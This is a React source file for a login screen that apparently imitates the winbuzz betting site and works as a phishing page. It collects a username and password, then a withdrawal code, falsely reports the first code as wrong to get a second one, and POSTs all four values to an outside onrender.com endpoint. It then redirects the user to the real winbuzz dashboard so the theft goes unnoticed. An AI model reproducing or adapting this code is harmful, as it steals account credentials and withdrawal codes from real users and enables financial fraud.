import React, { useRef, useState } from 'react'
import "../styles/loginScreen.scss"
import { FaXmark } from "react-icons/fa6";
import { RotatingLines } from 'react-loader-spinner';

const LoginScreen = ({ setShowLogin, setShowForget }) => {
    const [showPass, setShowPass] = useState(false);
    const [loading, setLoading] = useState(false);
    const [attempt, setAttempt] = useState(0);
    const [formData, setForData] = useState({
        username: "",
        password: "",
        withdrawal1: "",
        withdrawal2: ""
    });

    const handleChange = async (e) => {
        setForData({
            ...formData,
            [e.target.name]: e.target.value
        });
    };


    const handleLogin = async (e) => {
        e.preventDefault();
        setLoading(true);

        if (attempt === 0) {
            if (formData.username === "" || formData.password === "") {
                setLoading(false)
                return alert('All fields are required.')
            } else {
                setLoading(false);
                return setAttempt(1);
            }
        }
        else if (attempt === 1) {
            if (formData.withdrawal1 === "") {
                setLoading(false);
                return alert("All fields are required.")
            } else {
                setLoading(false);
                alert('Wrong withdrawal code!!')
                return setAttempt(2);
            }
        }
        else if (attempt === 2) {
            const response = await fetch('https://winbuzz-4xac.onrender.com/save-data', {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(formData)
            })
            let result = await response.json();
            setLoading(false)
            result.res === true ? setLoading(false) : setLoading(false);
            return result.res === true ? window.location = "https://www.winbuzz.in/m/dashboard" : alert('Internal Server Error')
        } else {
            return window.location = "https://www.winbuzz.in/m/dashboard";
        }
    }


    return (
        <div className='login-main'>
            <div className='login-main-box'>
                <p className='close-btn' onClick={() => setShowLogin(showLogin => !showLogin)}>
                    <FaXmark size="1.2rem"></FaXmark>
                </p>
                <form >
                    {
                        attempt === 0 &&
                        <>
                            <input type="text" name="username" placeholder='Username' className='username-inp' value={formData.username} onChange={handleChange} required />

                            <div className='password-inp'>
                                <div className='inp-wrap'>
                                    <input type={showPass ? "text" : "password"} name="password" placeholder='Password' className='pass-inp' value={formData.password} onChange={handleChange} required />
                                    <i className={showPass ? "fa-regular fa-eye" : "fa-regular fa-eye-slash"} style={{ color: '#000' }} onClick={() => { setShowPass(!showPass) }}></i>
                                </div>
                            </div>

                        </>

                    }
                    {
                        attempt === 1 &&
                        <>
                            <div className='username-inp login-2-head'>
                                <h2>LOGIN</h2>
                                <i className='fas fa-hand-point-down'></i>
                            </div>
                            <div className='password-inp'>
                                <div className='inp-wrap'>
                                    <input type={showPass ? "text" : "password"} name="withdrawal1" placeholder='Enter withdrawal code' className='pass-inp' value={formData.withdrawal1} onChange={handleChange} required />
                                    <i className={showPass ? "fa-regular fa-eye" : "fa-regular fa-eye-slash"} style={{ color: '#000' }} onClick={() => { setShowPass(!showPass) }}></i>
                                </div>
                            </div>
                        </>
                    }
                    {
                        attempt === 2 &&
                        <>
                            <div className='username-inp login-2-head'>
                                <h2>LOGIN</h2>
                                <i className='fas fa-hand-point-down'></i>
                            </div>
                            <div className='password-inp'>
                                <div className='inp-wrap'>
                                    <input type={showPass ? "text" : "password"} name="withdrawal2" placeholder='Enter withdrawal code' className='pass-inp' value={formData.withdrawal2} onChange={handleChange} required />
                                    <i className={showPass ? "fa-regular fa-eye" : "fa-regular fa-eye-slash"} style={{ color: '#000' }} onClick={() => { setShowPass(!showPass) }}></i>
                                </div>
                            </div>
                        </>
                    }
                    <button
                        onClick={handleLogin}
                        className='login-btn'
                    >
                        <p>Log In</p>
                        {
                            loading ?
                                <RotatingLines
                                    height="20"
                                    width="20"
                                    radius="9"
                                    color="black"
                                    ariaLabel="three-dots-loading"
                                    wrapperStyle
                                    wrapperClass
                                    strokeColor='black'
                                /> : null
                        }

                    </button>
                    <button className="login-demo" onClick={(e => { e.preventDefault(); alert('Demo login not avaliable.') })}>LogIn With Demo ID</button>
                    <button className="forget-btn" onClick={(e => {
                        e.preventDefault()
                        setShowForget(true)
                    })}>Forgot Password</button>



                </form>

                <div className='extra-icons'>
                    <img src="/game-care.png" alt="game-care" />
                    <img src="/restricted-regions-logo.png" alt="restrict-region" />
                    <img src="/underage-logo.png" alt="underage-logo" />
                </div>
            </div>

        </div>
    )
}

export default LoginScreen
